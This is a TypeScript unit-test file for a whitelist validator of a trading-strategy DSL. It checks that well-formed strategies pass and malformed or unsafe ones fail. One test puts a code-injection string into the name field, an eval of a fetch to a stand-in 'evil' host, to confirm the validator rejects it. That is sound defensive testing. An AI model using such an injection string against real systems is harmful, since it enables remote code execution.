// FULL — unit tests for the DSL whitelist validator. Run: npm test
import { describe, it, expect } from 'vitest';
import { validateDSL } from './validator';
import type { StrategyDSL } from './schema';

const good: StrategyDSL = {
  name: 'EMA cross + RSI filter',
  params: {
    emaFast: { type: 'int', min: 2, max: 50, default: 12 },
    emaSlow: { type: 'int', min: 10, max: 200, default: 50 },
    rsiBuy: { type: 'int', min: 10, max: 90, default: 40 },
  },
  entry: {
    op: 'AND',
    args: [
      { op: 'CROSS_UP', args: [
        { ind: 'EMA', src: 'CLOSE', len: '$emaFast' },
        { ind: 'EMA', src: 'CLOSE', len: '$emaSlow' },
      ] },
      { op: 'LT', args: [{ ind: 'RSI', len: 14 }, { op: 'CONST', v: '$rsiBuy' }] },
    ],
  },
  exit: {
    op: 'CROSS_DOWN',
    args: [
      { ind: 'EMA', src: 'CLOSE', len: '$emaFast' },
      { ind: 'EMA', src: 'CLOSE', len: '$emaSlow' },
    ],
  },
};

describe('validateDSL — accepts valid', () => {
  it('passes a well-formed strategy', () => {
    const r = validateDSL(good);
    expect(r.ok).toBe(true);
    expect(r.errors).toEqual([]);
  });
});

describe('validateDSL — rejects unsafe / malformed', () => {
  it('rejects unknown operator', () => {
    const bad = structuredClone(good);
    (bad.entry as { op: string }).op = 'EXEC';
    expect(validateDSL(bad).ok).toBe(false);
  });

  it('rejects unknown indicator', () => {
    const bad = structuredClone(good);
    (bad.exit as { args: { ind: string }[] }).args[0].ind = 'BACKDOOR';
    expect(validateDSL(bad).ok).toBe(false);
  });

  it('rejects code-injection strings', () => {
    const bad = { ...good, name: "x'); eval(fetch('//evil'))" };
    const r = validateDSL(bad);
    expect(r.ok).toBe(false);
    expect(r.errors.some((e) => e.includes('suspicious'))).toBe(true);
  });

  it('rejects an unknown $param reference', () => {
    const bad = structuredClone(good);
    (bad.entry as { args: { args: { len: string }[] }[] }).args[0].args[0].len = '$doesNotExist';
    expect(validateDSL(bad).ok).toBe(false);
  });

  it('rejects len out of range', () => {
    const bad = structuredClone(good);
    (bad.exit as { args: { len: number }[] }).args[0].len = 9999;
    expect(validateDSL(bad).ok).toBe(false);
  });

  it('rejects unknown fields', () => {
    const bad = structuredClone(good) as unknown as Record<string, unknown>;
    (bad.entry as Record<string, unknown>).danger = true;
    expect(validateDSL(bad).ok).toBe(false);
  });

  it('enforces max node count', () => {
    const r = validateDSL(good, { maxDepth: 8, maxNodes: 3, minLen: 2, maxLen: 400, maxConstAbs: 1e9 });
    expect(r.ok).toBe(false);
  });

  it('rejects a non-boolean root', () => {
    const bad = structuredClone(good);
    bad.entry = { ind: 'CLOSE' } as never;
    expect(validateDSL(bad).ok).toBe(false);
  });
});
